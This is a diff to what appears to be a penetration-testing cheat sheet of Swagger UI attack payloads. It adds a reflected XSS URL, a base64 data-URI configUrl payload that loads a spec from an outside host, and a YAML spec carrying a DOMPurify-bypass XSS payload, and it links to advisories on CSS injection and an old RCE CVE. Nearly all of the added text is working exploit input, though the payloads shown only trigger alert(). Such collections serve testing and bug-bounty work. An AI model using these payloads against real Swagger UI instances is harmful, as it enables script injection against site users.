@@ -9,6 +9,30 @@ https://wpscan.com/vulnerability/c311feef-7041-4c21-9525-132b9bd32f89
 
 #Swagger:
 
+RXSS at `/?url=%3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E`
+
+XSS through configUrl `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
+
+Dompurify DOM XSS:
+
+```
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+ ```
+
 **(CVE-unknown)** XSS old versions (file.json content):
 
 ``swagger: "2.0",
@@ -32,8 +56,6 @@ POC: /?url=https://cors-anywhere.herokuapp.com/https://gist.github.com/danzajork
 
 https://github.com/tarantula-team/CSS-injection-in-Swagger-UI
 
-
-**RXSS at /?url=%3Cscript%3Ealert(atob(%22SGVyZSBpcyB0aGUgWFNT%22))%3C/script%3E**
 
 The old CVE-2016-5641 that leads to rce https://www.rapid7.com/blog/post/2016/06/23/r7-2016-06-remote-code-execution-via-swagger-parameter-injection-cve-2016-5641/
 
